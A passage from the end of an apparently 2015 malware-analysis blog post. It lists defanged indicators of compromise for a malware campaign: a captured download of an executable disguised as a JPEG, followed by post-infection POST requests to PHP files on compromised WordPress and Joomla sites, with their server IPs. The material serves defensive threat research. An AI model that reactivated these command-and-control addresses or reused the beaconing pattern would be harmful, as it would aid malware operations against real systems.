+GET hxxp://boschservisi.info[.]tr:80/cgi-sys/suspendedpage.cgi?p=qovvtc388iq4bm
+GET hxxp://boschservisi.info[.]tr:80/cgi-sys/suspendedpage.cgi?y=4l425ka9qjn
+POST hxxp://boschservisi.info[.]tr:80/wp-content/themes/twentytwelve/d.php?b=cg1odjtnay
+POST hxxp://boschservisi.info[.]tr:80/wp-content/themes/twentytwelve/d.php?f=t1dfbt93fg
+POST hxxp://boschservisi.info[.]tr:80/wp-content/themes/twentytwelve/d.php?p=qovvtc388iq4bm
+POST hxxp://boschservisi.info[.]tr:80/wp-content/themes/twentytwelve/d.php?y=4l425ka9qjn
+Server IP: 94.102.1.207
+
+POST hxxp://hotfrance[.]ru:80/wp-content/themes/dreamynight-10/a.php?x=cg1odjtnay
+POST hxxp://hotfrance[.]ru:80/wp-content/themes/dreamynight-10/a.php?u=t1dfbt93fg
+POST hxxp://hotfrance[.]ru:80/wp-content/themes/dreamynight-10/a.php?p=4l425ka9qjn
+Server IP: 95.85.4.87
+</code></pre>
+
+<hr />
+
+<h4>five2.jpg/211954869.exe Analysis</h4>
+
+<pre><code># Payload Download: Response
+* Connected to 31072015a[.]com (107.15.99.91) port 80 (#0)
+User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:37.0) Gecko/20100101 Firefox/37.0
+Host: 31072015a[.]com
+Accept: */*
+HTTP/1.1 200 OK
+
+Server: Apache/2.2.15 (CentOS)
+Last-Modified: Wed, 05 Aug 2015 21:30:02 GMT
+ETag: "c100037-3a600-51c971b00f877"
+Accept-Ranges: bytes
+Content-Length: 239104
+Connection: close
+Content-Type: image/jpeg
+
+# Network Traffic
+Post-Infection Requests:
+POST hxxp://prestigecarstorage.com[.]au:80/wp-includes/Text/Text.php
+Server IP: 192.186.240.131
+
+POST hxxp://mcmamina[.]cz:80/media/plg_quickicon_joomlaupdate/plg_quickicon_joomlaupdate.php
+Server IP: 82.208.47.134
+
+POST hxxp://buyseoplan[.]com:80/wp-admin/includes/includes.php
+Server IP: 160.153.34.130
+
+POST hxxp://letssaidiana[.]com:80/wp-admin/user/user.php
+Server IP: 50.62.121.1
+
+POST hxxp://kenyadivas[.]com:80/media/editors/editors.php
+Server IP: 192.254.185.141
+
+POST hxxp://keithgerchak[.]com:80/wp-admin/css/css.php
+Server IP: 50.63.93.1
+
+POST hxxp://binarycashbackdaily[.]com:80/wp-admin/maint/maint.php
+Server IP: 198.15.118.164
+
+POST hxxp://apexsitesolutions[.]com:80/main/wp-admin/mod_html.php
+Server IP: 184.168.179.1
+
+POST hxxp://employerservice[.]net:80/wp-includes/theme-compat/theme-compat.php
+Server IP: 23.229.242.167
+
+POST hxxp://hmb.com[.]au:80/wp-admin/images/images.php
+Server IP: 192.186.203.132
+
+POST hxxp://denver-computer-repairs[.]com:80/wordpress2/wp-includes/fckeditor.php
+Server IP: 173.201.146.180
+
+POST hxxp://hatmandoo.co[.]uk:80/cache/mod_menu/mod_menu.php
+Server IP: 192.254.235.245
+
+POST hxxp://wizjafotografii[.]pl:80/wp-content/languages/languages.php
+Server IP: 46.16.186.66
+</code></pre>
+
+
+        <hr class="divider-short"/>
+
+        
+      </div>
+    </div>
+  </div>
+</article>
+
+<hr class="divider-short"/>
+
+<div class="archive-link">
+  <div class="container">
+    <div class="row">
+      <div class="col-md-8 col-md-offset-2">
+        
+          <a class="pull-left" href="/blog/2015/02/15/why-you-should-get-pocket/" title="Previous Post: why you should get pocket">&laquo; Previous: why you should get pocket</a>
+        
+
+        
+          <a class="pull-right" href="/blog/2015/08/11/more-emails-with-malicious-javascript-attachments/" title="Next Post: More Emails With Malicious JavaScript Attachments">Next: More Emails With Malicious JavaScript Attachments &raquo;</a>
+        
+      </div>
+    </div>
+  </div>
+</div>
+
+    <footer id="footer" class="her-row">
+  <div class="container">
+    <div class="row">
+      <div class="col-md-1">
+  <a href="/"><h4>Home</h4></a>
+</div>
+
+<div class="col-md-2">
+  <div class="social-icon-list">
+    
+    <a href="https://twitter.com/_elauqsap"><img src="/images/glyphicons_social_31_twitter.png"/></a>
+    
+
+    
+    <a href="https://github.com/elauqsap"><img src="/images/glyphicons_social_21_github.png"/></a>
+    
+
+    
+
+    
+    <a href="mailto:3lauqsap@gmail.com"><img src="/images/glyphicons_social_39_e-mail.png"/></a>
+    
+  </div>
+</div>
+
+<div class="pull-right">
+  <h4>Powered by <a href="http://octopress.org/">Octopress</a>.</h4>
+</div>
+
+
+    </div>
+  </div>
+</footer>
+
+    
+  </body>
+</html>
